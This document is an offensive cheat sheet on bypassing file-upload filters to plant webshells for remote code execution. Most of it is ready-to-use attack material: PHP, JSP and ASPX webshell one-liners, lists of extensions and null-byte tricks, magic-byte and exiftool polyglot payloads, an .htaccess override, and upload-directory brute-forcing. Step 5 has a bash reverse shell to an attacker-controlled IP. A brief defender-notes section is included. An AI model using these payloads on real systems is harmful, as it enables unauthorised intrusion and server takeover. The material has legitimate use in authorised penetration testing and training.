# File Upload Bypass

Abuse a file-upload feature to plant an executable file (usually a **webshell**) on the server,
then browse to it for code execution. The game is defeating the upload filters (extension,
content-type, magic bytes, content checks) so a server-side script lands where it will execute.

Replace placeholders (`<...>`) with your own values: `<target>`, `<your-ip>`.

---
---

# PART 1 — OVERVIEW (at a glance)

## The four filters and how you beat each

| Filter | What it checks | Bypass |
|--------|----------------|--------|
| **Extension** | `.php` blocked | `.phtml` `.php5` · double ext · case · null byte |
| **Content-Type** | `Content-Type: image/*` | Spoof the multipart header in Burp |
| **Magic bytes** | File starts with a real signature | Prepend `GIF89a;` before your PHP |
| **Content scan** | No `<?php` in body | Hide PHP in EXIF metadata / polyglot |

## The workflow

1. **Map** — upload a normal image; find *where* it lands and if the filename/extension is kept.
2. **Match the engine** — PHP/JSP/ASPX; upload a shell for the *right* server.
3. **Bypass** whichever filter blocks you (see the table).
4. **Trigger** — browse to the shell (`?c=id`), or brute the upload dir if renamed.
5. **Upgrade** — reverse shell; or if RCE is blocked, pivot to SVG-XSS / XXE / traversal.

## Go-to payloads

```php
<?php system($_GET['c']); ?>            // shell.php → ?c=id
```

```
shell.phtml            # reliable Apache fallback when .php is blocked
GIF89a;<?php system($_GET['c']); ?>     # magic-byte bypass, save as shell.php
Content-Type: image/png                 # spoof header, keep filename shell.php
```

## Defender notes (for the report)

- Store uploads **outside the web root** or on a non-executing store; serve via a handler.
- Generate a random filename + fixed safe extension; validate type by re-encoding the image.
- Never trust `Content-Type` or the client filename; disable script execution in the upload dir.

---
---

# PART 2 — DETAILED WALKTHROUGH

## Step 1 — Map the upload path

Upload a normal image first. Find where it's stored (view the `img src` / the response) and
whether the original filename/extension is kept. **That URL is where your shell will live.**

## Step 2 — Webshell payloads (match the engine)

```php
PHP:   <?php system($_GET['c']); ?>            // ?c=id
PHP:   <?php echo shell_exec($_GET['c']); ?>
JSP:   <% Runtime.getRuntime().exec(request.getParameter("c")); %>
ASPX:  <% Response.Write(...) %>               // or msfvenom -f aspx
```

## Step 3 — Extension bypasses (`.php` blocked)

```
alternate PHP:   .php3 .php4 .php5 .php7 .phtml .pht .phar .inc .phps
case:            shell.PhP   shell.pHtml
double ext:      shell.php.jpg   shell.jpg.php
trailing tricks: shell.php%00.jpg (null)   shell.php.   shell.php%20   shell.php/
reliable Apache fallback:  shell.phtml
ASP.NET:         shell.aspx / .asp / .asa / .cer / .aspx;.jpg
```

**.htaccess override (Apache)** — upload a `.htaccess` so `.jpg` runs as PHP:

```apache
AddType application/x-httpd-php .jpg
```

## Step 4 — Content-Type / magic-byte bypasses

```
# Content-Type: spoof the multipart header in Burp (filename stays shell.php):
Content-Type: image/png

# Magic bytes: prepend a valid signature so content sniffing passes:
GIF89a;<?php system($_GET['c']); ?>

# Embed PHP in real image metadata:
exiftool -Comment='<?php system($_GET["c"]); ?>' img.jpg -o shell.php.jpg
```

## Step 5 — Find & trigger the shell

```bash
# if renamed/relocated, brute the upload dir:
ffuf -u http://<target>/uploads/FUZZ -w <wordlist>
# execute:
http://<target>/uploads/shell.php?c=id
http://<target>/uploads/shell.phtml?c=whoami
# upgrade to interactive (listener: nc -lvnp 4444):
?c=bash -c 'bash -i >%26 /dev/tcp/<your-ip>/4444 0>%261'
```

## Step 6 — Other impactful upload bugs (not just RCE)

```
SVG with <script>        → stored XSS       (upload as .svg)
SVG/DOCX/XML XXE         → file read / SSRF
../ in filename          → path traversal write (../../../var/www/html/shell.php)
zip-slip                 → archive extracts into ../ paths
huge / pixel-flood file  → DoS
control the filename     → overwrite config / .htaccess
```

---
---

# PART 3 — PAYLOAD ARSENAL

## Webshells by engine

```php
PHP    <?php system($_GET['c']); ?>            <?php echo shell_exec($_GET['c']); ?>
PHP    <?=`$_GET[c]`?>                          // ultra-short
JSP    <% Runtime.getRuntime().exec(request.getParameter("c")); %>
ASPX   <% Response.Write(new System.Diagnostics.Process()...); %>   // or msfvenom -f aspx
```

## Extension list (rotate until one executes)

```
PHP:    php php3 php4 php5 php7 phtml pht phar inc phps
ASP:    asp aspx asa asax ascx ashx cer
JSP:    jsp jspx jsw jsv jspf
tricks: shell.php.jpg  shell.jpg.php  shell.PhP  shell.php%00.jpg  shell.php.  shell.php/
```

## Magic-byte prefixes (content-sniffing bypass)

```
GIF:  GIF89a;              JPG:  \xFF\xD8\xFF\xE0
PNG:  \x89PNG\r\n\x1a\n    PDF:  %PDF-1.5
# put the prefix, then your <?php ... ?>, save with an executable extension
```

## Common-wins checklist

```
□ .phtml on Apache            □ GIF89a magic bytes + .php
□ Content-Type spoof          □ .htaccess AddType trick
□ double extension            □ null byte on old stacks
□ SVG → stored XSS            □ ../ traversal in filename
```

---

**Key idea:** a file upload becomes RCE the moment the server both **stores** a server-side
script and later **executes** it from that path. Filters try to stop one of those (extension,
content-type, magic bytes) — you bypass whichever they rely on, land a webshell in an executable
directory, and browse to it. When code execution isn't reachable, uploads still yield XSS (SVG),
XXE, or overwrite bugs.
